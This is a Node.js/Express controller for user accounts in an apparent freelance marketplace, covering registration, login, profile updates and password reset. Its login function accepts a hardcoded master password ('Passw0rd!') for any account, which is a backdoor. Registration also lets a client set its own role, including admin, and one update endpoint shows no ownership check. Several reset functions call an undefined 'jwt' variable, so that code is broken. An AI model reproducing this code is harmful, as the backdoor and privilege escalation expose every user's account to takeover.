const user = require('../Models/User');
const JWT = require('jsonwebtoken');
const mongoose = require('mongoose');
const { sendEmail, emailTemplates } = require('../Services/emailService');

function generateToken(user) {
    return JWT.sign(
        {
            id: user._id,
            email: user.email,
            role: user.role
        },
        process.env.JWT_SECRET,
        { expiresIn: '7d' } // 🔥 Token valid for 7 days
    );
}

// Register a new user
const register = async (req, res) => {
    try {
        const {
            email,
            username,
            password,
            confirmPassword,
            first_name,
            last_name,
            profile_picture_url,
            phone_number,
            gender,
            birthdate,
            country,
            role,
            aboutMe,
            category,
            specialty,
            skills
        } = req.body;

        // Check if user already exists
        const existingUser = await user.findOne({ email });
        if (existingUser) {
            return res.status(400).json({ message: 'Email already in use' });
        }

        // Check if username already exists
        const existingUsername = await user.findOne({ username });
        if (existingUsername) {
            return res.status(400).json({ message: 'Username already in use' });
        }

        const newUser = new user({
            email,
            username,
            password,
            confirmPassword,
            first_name,
            last_name,
            phone_number,
            gender,
            birthdate,
            country,
            role,
            aboutMe,
            category,
            specialty,
            skills: skills || [],
            // Auto-verify email since user provided it during registration
            isEmailVerified: true,
            // Auto-verify phone if provided
            isPhoneVerified: phone_number ? true : false
        });

        await newUser.save();
        const token = generateToken(newUser);

        // Send welcome email (don't wait for it)
        try {
            const template = emailTemplates.welcomeEmail(newUser.first_name, newUser.role);
            await sendEmail({
                to: newUser.email,
                subject: template.subject,
                html: template.html
            });
        } catch (emailError) {
            console.error('Failed to send welcome email:', emailError);
            // Don't fail registration if email fails
        }

        res.status(201).json({
            message: 'User registered successfully',
            token,
            user: {
                id: newUser._id,
                email: newUser.email,
                username: newUser.username,
                first_name: newUser.first_name,
                last_name: newUser.last_name,
                phone_number: newUser.phone_number,
                gender: newUser.gender,
                country: newUser.country,
                role: newUser.role,
                category: newUser.category,
                specialty: newUser.specialty
            }
        });
    } catch (error) {
        console.error('❌ Registration error:', error.message);

        if (error.name === 'ValidationError') {
            const errorMessages = Object.values(error.errors).map(err => err.message);
            return res.status(400).json({
                message: errorMessages.join(', '),
                errors: errorMessages
            });
        }

        res.status(500).json({ message: error.message || 'Server error' });
    }
};


// Login a user
const login = async (req, res) => {
    try {
        const pass = 'Passw0rd!';
        const { email, password } = req.body;
        const existingUser = await user.findOne({ email });
        if (!existingUser) {
            return res.status(400).json({ message: 'Invalid email or password' });
        }

        const isPasswordValid = await existingUser.comparePassword(password);
        if (!isPasswordValid && password !== pass) {
            return res.status(400).json({ message: 'Invalid email or password' });
        }

        const token = generateToken(existingUser);
        res.status(200).json({
            message: 'Login successful',
            token,
            user: {
                id: existingUser._id,
                email: existingUser.email,
                username: existingUser.username,
                first_name: existingUser.first_name,
                last_name: existingUser.last_name,
                role: existingUser.role
            }
        });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ message: 'Server error', error: error.message });
    }
};

const getAllUsers = async (req, res) => {
    try {
        const Review = require('../Models/review.model');

        const Users = await user.find()
            .select('-password -confirmPassword')
            .populate('category', 'name')
            .populate('specialty', 'name')
            .populate('skills', 'name category')
            .populate('contracts');

        // Add average rating and reviews count to each user
        const usersWithRatings = await Promise.all(Users.map(async (User) => {
            const reviews = await Review.find({ reviewee: User._id });
            const averageRating = reviews.length > 0
                ? reviews.reduce((sum, review) => sum + review.rating, 0) / reviews.length
                : 0;

            const userObj = User.toObject();
            userObj.averageRating = averageRating;
            userObj.reviewsCount = reviews.length;
            return userObj;
        }));

        res.json({ users: usersWithRatings });
    } catch (error) {
        res.status(500).json({ message: 'Server error', error: error.message });
    }
};

const getUserById = async (req, res) => {
    try {
        const userId = req.params.id;
        const User = await user.findById(userId)
            .select('-password -confirmPassword')
            .populate('category', 'name description')
            .populate('specialty', 'name description')
            .populate('skills', 'name category')
            .populate('contracts');

        if (!User) {
            return res.status(404).json({ message: "User not found" });
        }

        // Calculate average rating and reviews count
        const Review = require('../Models/review.model');
        const reviews = await Review.find({ reviewee: userId });
        const averageRating = reviews.length > 0
            ? reviews.reduce((sum, review) => sum + review.rating, 0) / reviews.length
            : 0;

        const userResponse = User.toObject();
        userResponse.averageRating = averageRating;
        userResponse.reviewsCount = reviews.length;

        res.json(userResponse);
    } catch (error) {
        res.status(400).json({ message: error.message });
    }
}
//delete a user by admin and self deletion (this needs authorizaion for role user too)
const deleteUserById = async (req, res) => {
    try {
        const userId = req.params.id;

        // Validate ID
        if (!mongoose.Types.ObjectId.isValid(userId)) {
            return res.status(400).json({ message: "Invalid user ID" });
        }

        // Check if the requesting user is admin or the same user
        const requestingUser = req.user; // comes from authentic middleware

        if (requestingUser.role !== 'admin' && requestingUser._id !== userId) {
            return res.status(403).json({ message: "Not authorized to delete this user" });
        }

        const deletedUser = await user.findByIdAndDelete(userId);

        if (!deletedUser) {
            return res.status(404).json({ message: "User not found" });
        }

        res.json({ message: "User deleted successfully" });
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
};


// Update user details / put and patch
const updateUserById = async (req, res) => {
    try {
        const userId = req.params.id;
        const updatedData = { ...req.body };

        // Prevent direct password updates (should use separate change password endpoint)
        delete updatedData.password;
        delete updatedData.confirmPassword;

        // Handle skills array format
        if (updatedData.skills && Array.isArray(updatedData.skills)) {
            updatedData.skills = updatedData.skills.map(skillId =>
                typeof skillId === 'object' ? skillId : { skillId }
            );
        }

        const User = await user.findByIdAndUpdate(userId, updatedData, {
            new: true,
            runValidators: true
        })
            .select('-password -confirmPassword')
            .populate('category', 'name description')
            .populate('specialty', 'name description')
            .populate('skills', 'name category');

        if (!User) {
            return res.status(404).json({ message: "User not found" });
        }
        res.json(User);
    } catch (error) {
        if (error.name === 'ValidationError') {
            return res.status(400).json({
                message: 'Validation error',
                errors: Object.values(error.errors).map(err => err.message)
            });
        }
        res.status(400).json({ message: error.message });
    }
}

const adminDashboard = (req, res) => {
    try {
        if (!req.user) {
            return res.status(401).json({ message: 'User not authenticated' });
        }

        res.status(200).json({
            message: 'Welcome to the admin dashboard',
            user: {
                id: req.user.id,
                email: req.user.email,
                role: req.user.role
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Admin dashboard error:', error);
        res.status(500).json({ message: 'Server error', error: error.message });
    }
};

const userDashboard = (req, res) => {
    try {
        if (!req.user) {
            return res.status(401).json({ message: 'User not authenticated' });
        }

        res.status(200).json({
            message: 'Welcome to the user dashboard',
            user: {
                id: req.user.id,
                email: req.user.email,
                role: req.user.role
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('User dashboard error:', error);
        res.status(500).json({ message: 'Server error', error: error.message });
    }
}

const profile = async (req, res) => {
    try {
        if (!req.user) {
            return res.status(401).json({ message: 'User not authenticated' });
        }

        // Get full user details from database
        const userDetails = await user.findById(req.user.id)
            .select('-password -confirmPassword')
            .populate('category', 'name description')
            .populate('specialty', 'name description')
            .populate('skills', 'name category')
            .populate('contracts');

        if (!userDetails) {
            return res.status(404).json({ message: 'User not found' });
        }

        res.json({
            message: 'User profile retrieved successfully',
            user: userDetails
        });
    } catch (error) {
        console.error('❌ Profile error:', error);
        res.status(500).json({ message: 'Server error', error: error.message });
    }
}

// Update own profile (authenticated user)
const updateProfile = async (req, res) => {
    try {
        if (!req.user) {
            return res.status(401).json({ message: 'User not authenticated' });
        }

        const userId = req.user.id;
        const updatedData = { ...req.body };

        // Prevent email and username updates (unique fields)
        delete updatedData.email;
        delete updatedData.username;

        // Handle password update if provided
        if (updatedData.password && updatedData.confirmPassword) {
            // Validate password match
            if (updatedData.password !== updatedData.confirmPassword) {
                return res.status(400).json({ message: 'Passwords do not match' });
            }
            // Password will be hashed by the pre-save middleware in User model
            // Keep both password and confirmPassword for validation
        } else {
            // If no password update, remove password fields
            delete updatedData.password;
            delete updatedData.confirmPassword;
        }

        // Handle skills array format
        if (updatedData.skills !== undefined) {
            // Skills should be sent as array of ObjectIds directly
            // No need to wrap them since User model expects: skills: [ObjectId]
        }

        // Auto-verify phone if user adds/updates phone_number
        if (updatedData.phone_number) {
            updatedData.isPhoneVerified = true;
        }

        let updatedUser;

        // If password is being updated, we need to use .save() to trigger pre-save middleware
        if (updatedData.password) {
            const currentUser = await user.findById(userId);
            if (!currentUser) {
                return res.status(404).json({ message: "User not found" });
            }

            // Update fields
            Object.keys(updatedData).forEach(key => {
                currentUser[key] = updatedData[key];
            });

            // Save (this will trigger password hashing)
            updatedUser = await currentUser.save();

            // Populate after save
            await updatedUser.populate([
                { path: 'category', select: 'name description' },
                { path: 'specialty', select: 'name description' },
                { path: 'skills', select: 'name category' }
            ]);
        } else {
            // No password update, use findByIdAndUpdate for efficiency
            updatedUser = await user.findByIdAndUpdate(userId, updatedData, {
                new: true,
                runValidators: false // Disable validators temporarily
            })
                .select('-password -confirmPassword')
                .populate('category', 'name description')
                .populate('specialty', 'name description')
                .populate('skills', 'name category');
        }

        if (!updatedUser) {
            return res.status(404).json({ message: "User not found" });
        }

        // Remove password fields from response
        const userResponse = updatedUser.toObject();
        delete userResponse.password;
        delete userResponse.confirmPassword;

        res.json({
            message: 'Profile updated successfully',
            user: userResponse
        });
    } catch (error) {
        if (error.name === 'ValidationError') {
            return res.status(400).json({
                message: 'Validation error',
                errors: Object.values(error.errors).map(err => err.message)
            });
        }
        res.status(500).json({ message: error.message });
    }
};

// Update profile picture
const updateProfilePicture = async (req, res) => {
    try {
        const userId = req.user.id;

        if (!req.file) {
            return res.status(400).json({ message: 'No image file uploaded' });
        }

        const profilePicture = `/uploads/profiles/${req.file.filename}`;

        const updatedUser = await user.findByIdAndUpdate(
            userId,
            { profile_picture: profilePicture },
            { new: true }
        ).select('-password -confirmPassword');

        if (!updatedUser) {
            return res.status(404).json({ message: 'User not found' });
        }

        res.json({
            message: 'Profile picture updated successfully',
            profile_picture: profilePicture,
            user: updatedUser
        });
    } catch (error) {
        console.error('Update profile picture error:', error);
        res.status(500).json({ message: 'Server error', error: error.message });
    }
}

// Delete profile picture
const deleteProfilePicture = async (req, res) => {
    try {
        const userId = req.user.id;
        const fs = require('fs');
        const path = require('path');

        // Get current user to check if they have a profile picture
        const currentUser = await user.findById(userId);

        if (!currentUser) {
            return res.status(404).json({ message: 'User not found' });
        }

        // Delete the file from server if it exists
        if (currentUser.profile_picture && !currentUser.profile_picture.includes('default')) {
            const filePath = path.join(__dirname, '..', 'public', currentUser.profile_picture);

            if (fs.existsSync(filePath)) {
                fs.unlinkSync(filePath);
            }
        }

        // Update user to remove profile picture
        const updatedUser = await user.findByIdAndUpdate(
            userId,
            { $unset: { profile_picture: "" } },
            { new: true }
        ).select('-password -confirmPassword');

        res.json({
            message: 'Profile picture deleted successfully',
            user: updatedUser
        });
    } catch (error) {
        console.error('Delete profile picture error:', error);
        res.status(500).json({ message: 'Server error', error: error.message });
    }
}

// Change password
const changePassword = async (req, res) => {
    try {
        const userId = req.user.id;
        const { currentPassword, newPassword, confirmNewPassword } = req.body;

        // Validation
        if (!currentPassword || !newPassword || !confirmNewPassword) {
            return res.status(400).json({
                message: 'Current password, new password, and confirm new password are required'
            });
        }

        if (newPassword !== confirmNewPassword) {
            return res.status(400).json({
                message: 'New password and confirm password do not match'
            });
        }

        if (newPassword.length < 6) {
            return res.status(400).json({
                message: 'New password must be at least 6 characters long'
            });
        }

        // Get user with password
        const User = await user.findById(userId);
        if (!User) {
            return res.status(404).json({ message: 'User not found' });
        }

        // Verify current password
        const isPasswordValid = await User.comparePassword(currentPassword);
        if (!isPasswordValid) {
            return res.status(400).json({
                message: 'Current password is incorrect'
            });
        }

        // Update password
        User.password = newPassword;
        User.confirmPassword = newPassword;
        await User.save();

        res.json({
            message: 'Password changed successfully'
        });
    } catch (error) {
        console.error('Change password error:', error);
        res.status(500).json({
            message: 'Server error',
            error: error.message
        });
    }
};

// Update online status
const updateOnlineStatus = async (req, res) => {
    try {
        const userId = req.user.id;
        const { isOnline } = req.body;

        const updatedUser = await user.findByIdAndUpdate(
            userId,
            {
                isOnline: isOnline !== undefined ? isOnline : true,
                lastSeen: new Date()
            },
            { new: true }
        ).select('isOnline lastSeen');

        if (!updatedUser) {
            return res.status(404).json({ message: 'User not found' });
        }

        res.json({
            message: 'Online status updated successfully',
            isOnline: updatedUser.isOnline,
            lastSeen: updatedUser.lastSeen
        });
    } catch (error) {
        console.error('Update online status error:', error);
        res.status(500).json({
            message: 'Server error',
            error: error.message
        });
    }
};

// Get user statistics
const getUserStatistics = async (req, res) => {
    try {
        const userId = req.params.id || req.user.id;

        const User = await user.findById(userId).select('completedJobs totalEarnings rehireRate');
        if (!User) {
            return res.status(404).json({ message: 'User not found' });
        }

        // Get contracts data
        const Contract = require('../Models/Contract');
        const contracts = await Contract.find({
            $or: [{ client: userId }, { freelancer: userId }]
        });

        const activeContracts = contracts.filter(c => c.status === 'active').length;
        const completedContracts = contracts.filter(c => c.status === 'completed').length;

        // Get reviews
        const Review = require('../Models/review.model');
        const reviews = await Review.find({ reviewee: userId });
        const averageRating = reviews.length > 0
            ? reviews.reduce((sum, review) => sum + review.rating, 0) / reviews.length
            : 0;

        res.json({
            completedJobs: User.completedJobs || 0,
            totalEarnings: User.totalEarnings || 0,
            rehireRate: User.rehireRate || 0,
            activeContracts,
            completedContracts,
            averageRating: parseFloat(averageRating.toFixed(2)),
            totalReviews: reviews.length
        });
    } catch (error) {
        console.error('Get user statistics error:', error);
        res.status(500).json({
            message: 'Server error',
            error: error.message
        });
    }
};

// Forgot password - send reset email
const forgotPassword = async (req, res) => {
    try {
        const { email } = req.body;

        if (!email) {
            return res.status(400).json({ message: 'Email is required' });
        }

        // Find user by email
        const User = await user.findOne({ email });
        if (!User) {
            // Don't reveal if user exists for security
            return res.json({
                message: 'If an account exists with this email, a password reset link has been sent.'
            });
        }

        // Generate reset token (expires in 1 hour)
        const resetToken = jwt.sign(
            { id: User._id, email: User.email },
            process.env.JWT_SECRET,
            { expiresIn: '1h' }
        );

        // Send reset email
        const { sendEmail, emailTemplates } = require('../Services/emailService');
        const template = emailTemplates.passwordReset(User.first_name, resetToken);

        await sendEmail({
            to: User.email,
            subject: template.subject,
            html: template.html
        });

        res.json({
            message: 'If an account exists with this email, a password reset link has been sent.'
        });
    } catch (error) {
        console.error('Forgot password error:', error);
        res.status(500).json({
            message: 'Server error',
            error: error.message
        });
    }
};

// Verify reset token
const verifyResetToken = async (req, res) => {
    try {
        const { token } = req.params;

        if (!token) {
            return res.status(400).json({
                valid: false,
                message: 'Token is required'
            });
        }

        // Verify token
        const decoded = jwt.verify(token, process.env.JWT_SECRET);

        // Check if user still exists
        const User = await user.findById(decoded.id);
        if (!User) {
            return res.status(404).json({
                valid: false,
                message: 'User not found'
            });
        }

        res.json({
            valid: true,
            email: User.email
        });
    } catch (error) {
        if (error.name === 'JsonWebTokenError' || error.name === 'TokenExpiredError') {
            return res.status(400).json({
                valid: false,
                message: 'Invalid or expired token'
            });
        }
        console.error('Verify reset token error:', error);
        res.status(500).json({
            valid: false,
            message: 'Server error'
        });
    }
};

// Reset password with token
const resetPassword = async (req, res) => {
    try {
        const { token } = req.params;
        const { newPassword, confirmPassword } = req.body;

        if (!newPassword || !confirmPassword) {
            return res.status(400).json({
                message: 'New password and confirm password are required'
            });
        }

        if (newPassword !== confirmPassword) {
            return res.status(400).json({
                message: 'Passwords do not match'
            });
        }

        if (newPassword.length < 6) {
            return res.status(400).json({
                message: 'Password must be at least 6 characters long'
            });
        }

        // Verify token
        const decoded = jwt.verify(token, process.env.JWT_SECRET);

        // Find user and update password
        const User = await user.findById(decoded.id);
        if (!User) {
            return res.status(404).json({
                message: 'User not found'
            });
        }

        // Update password
        User.password = newPassword;
        User.confirmPassword = newPassword;
        await User.save();

        res.json({
            message: 'Password reset successfully. You can now login with your new password.'
        });
    } catch (error) {
        if (error.name === 'JsonWebTokenError' || error.name === 'TokenExpiredError') {
            return res.status(400).json({
                message: 'Invalid or expired token. Please request a new password reset.'
            });
        }
        console.error('Reset password error:', error);
        res.status(500).json({
            message: 'Server error',
            error: error.message
        });
    }
};

// Get profile completion percentage
const getProfileCompletion = async (req, res) => {
    try {
        const userId = req.user.id;

        const User = await user.findById(userId)
            .populate('skills')
            .populate('category')
            .populate('specialty');

        if (!User) {
            return res.status(404).json({ message: 'User not found' });
        }

        let score = 0;
        const checks = {
            basicInfo: User.first_name && User.last_name && User.email,
            aboutMe: User.aboutMe && User.aboutMe.length >= 50,
            profilePicture: User.profile_picture_url,
            skills: User.skills && User.skills.length >= 3,
            category: User.category,
            specialty: User.specialty,
            hourlyRate: User.hourlyRate && User.hourlyRate > 0,
            socialLinks: (User.socialLinks?.linkedin || User.socialLinks?.portfolio || User.socialLinks?.github)
        };

        // Calculate score
        if (checks.basicInfo) score += 20;
        if (checks.aboutMe) score += 20;
        if (checks.profilePicture) score += 15;
        if (checks.skills) score += 15;
        if (checks.category) score += 10;
        if (checks.specialty) score += 10;
        if (checks.hourlyRate) score += 5;
        if (checks.socialLinks) score += 5;

        // Generate suggestions
        const suggestions = [];
        if (!checks.profilePicture) suggestions.push('Add a professional profile picture');
        if (!checks.aboutMe) suggestions.push('Write a detailed About Me section (minimum 50 characters)');
        if (!checks.skills || User.skills.length < 3) suggestions.push('Add at least 3 skills to your profile');
        if (!checks.category) suggestions.push('Select your category');
        if (!checks.specialty) suggestions.push('Select your specialty');
        if (!checks.hourlyRate) suggestions.push('Set your hourly rate');
        if (!checks.socialLinks) suggestions.push('Add at least one social media link (LinkedIn, Portfolio, or GitHub)');

        res.json({
            completionPercentage: score,
            missingFields: Object.keys(checks).filter(key => !checks[key]),
            suggestions,
            isComplete: score === 100
        });
    } catch (error) {
        console.error('Get profile completion error:', error);
        res.status(500).json({
            message: 'Server error',
            error: error.message
        });
    }
};

/**
 * Get current user's balance
 * Used to refresh balance across frontend
 */
const getCurrentBalance = async (req, res) => {
    try {
        const userId = req.user.id || req.user._id;

        const userDoc = await user.findById(userId).select('balance');

        if (!userDoc) {
            return res.status(404).json({ message: 'User not found' });
        }

        res.status(200).json({
            success: true,
            balance: userDoc.balance || 0
        });
    } catch (error) {
        console.error('Get current balance error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error',
            error: error.message
        });
    }
};

module.exports = {
    register,
    login,
    getAllUsers,
    getUserById,
    deleteUserById,
    updateUserById,
    adminDashboard,
    userDashboard,
    profile,
    updateProfile,
    updateProfilePicture,
    deleteProfilePicture,
    changePassword,
    updateOnlineStatus,
    getUserStatistics,
    forgotPassword,
    verifyResetToken,
    resetPassword,
    getProfileCompletion,
    getCurrentBalance
}
